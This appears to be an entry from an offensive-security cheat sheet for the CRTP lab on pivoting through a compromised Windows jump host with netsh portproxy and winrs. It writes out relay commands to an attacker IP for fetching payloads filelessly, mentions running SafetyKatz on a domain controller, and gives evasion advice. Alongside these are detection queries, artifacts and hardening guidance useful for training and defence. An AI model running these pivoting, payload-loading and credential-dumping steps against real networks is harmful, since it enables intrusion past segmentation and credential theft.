name: Pivoting with netsh portproxy + winrs
command: netsh interface portproxy add v4tov4 listenport=<listen_port> listenaddress=0.0.0.0 connectport=<dst_port> connectaddress=<attacker_ip>
description: Reach hosts that can't talk to your attack box directly by turning a compromised jump host into a relay. netsh portproxy forwards a local port on the jump host to your web server, so tools like Loader.exe on the deep host can fetch payloads from http://127.0.0.1:<port>/. Commands are driven remotely over winrs.

variations.label: Add a portproxy on the jump host (remote via winrs)
variations.command: winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>

variations.label: Fetch + run a tool through the proxy on the deep host
Stage the loader to the deep host first

steps.label: Copy Loader to the jump/deep host
On the jump host, forward 8080 -> your web server:80
steps.command: $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

examples.label: Reach the DC through dcorp-mgmt
examples.command: winrs -r:dcorp-dc cmd /c "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

notes: Used throughout CRTP when a deep host (dcorp-mgmt, dcorp-dc) can't reach the student web server directly - the compromised intermediary becomes the relay. Pair with winrs for remote command execution and Loader.exe for fileless assembly loading over 127.0.0.1. Remove the portproxy afterward: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0.

recommended.note: winrs/PSRemoting is how you drive the jump host
Loader fetches assemblies through the 127.0.0.1 proxy
Run SafetyKatz on the deep host via the proxy

defense.prerequisites: Admin/remoting rights on the jump host (to run netsh and winrs). WinRM (5985) reachable to the jump host; the jump host can reach both you and the deep target.
defense.why_it_works: netsh interface portproxy is a built-in Windows userland TCP forwarder; combined with WinRM remote execution it lets a compromised host relay arbitrary traffic between network segments that are otherwise isolated - no third-party tooling needed (living off the land).
defense.misconfiguration: WinRM broadly enabled; local admins able to create portproxy rules; flat networks / no segmentation between tiers; egress from servers to attacker infrastructure permitted.
defense.impact: Bridges network segmentation - lets the attacker reach and execute on isolated DCs/servers and pull fileless payloads into them, extending compromise deep into the environment.
defense.detection: Creation of portproxy rules (netsh interface portproxy add) - Sysmon 1 / 4688 command line; the iphlpsvc portproxy registry key (HKLM\...\PortProxy\v4tov4). WinRM (5985) sessions issuing netsh/loader commands; unexpected listening ports on servers; loopback HTTP fetches of .exe.
defense.artifacts: PortProxy registry entries; netsh command lines in process logs; WSMan/WinRM operational logs; new listeners (netstat) on the jump host.
defense.splunk_spl:
index=sysmon EventCode=1 (CommandLine="*interface portproxy add*" OR CommandLine="*netsh*portproxy*")
| table _time, Computer, User, CommandLine

index=sysmon EventCode=13 TargetObject="*\\Services\\PortProxy\\v4tov4*"
| table _time, Computer, TargetObject, Details
defense.sentinel_kql:
DeviceProcessEvents
| where ProcessCommandLine has "portproxy" and ProcessCommandLine has "add"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc
defense.vulnerable_config:
# WinRM enabled on servers; local admins can run netsh
# Flat network, servers can reach the internet/attacker
# No alerting on portproxy creation
defense.secure_config:
# Restrict WinRM to management subnets/jump servers (IPSec/firewall)
# Network segmentation + host firewall deny east-west
# Alert on 'netsh interface portproxy add' and PortProxy registry writes
# Egress filtering from server tiers
defense.prevention: Segment the network and restrict WinRM to PAWs; block server egress to untrusted hosts; alert on portproxy rule creation and WinRM-driven netsh. [MITRE M1030, M1037, M1042]
defense.evasion: Uses only built-in tools (netsh/winrs) so blends with admin activity; tear down the portproxy rule after use to remove the artifact.

explain:
Turns a compromised jump host into a relay so deep hosts that cannot reach your box can fetch payloads:
  netsh interface portproxy add v4tov4   add an IPv4->IPv4 forward on the jump host
  listenport=<listen_port> listenaddress=0.0.0.0   accept connections on this port, all interfaces
  connectport=<dst_port> connectaddress=<attacker_ip>   forward them to your web server
Then tools on the deep host (Loader.exe -path http://127.0.0.1:<listen_port>/...) reach you through the jump host, fileless.
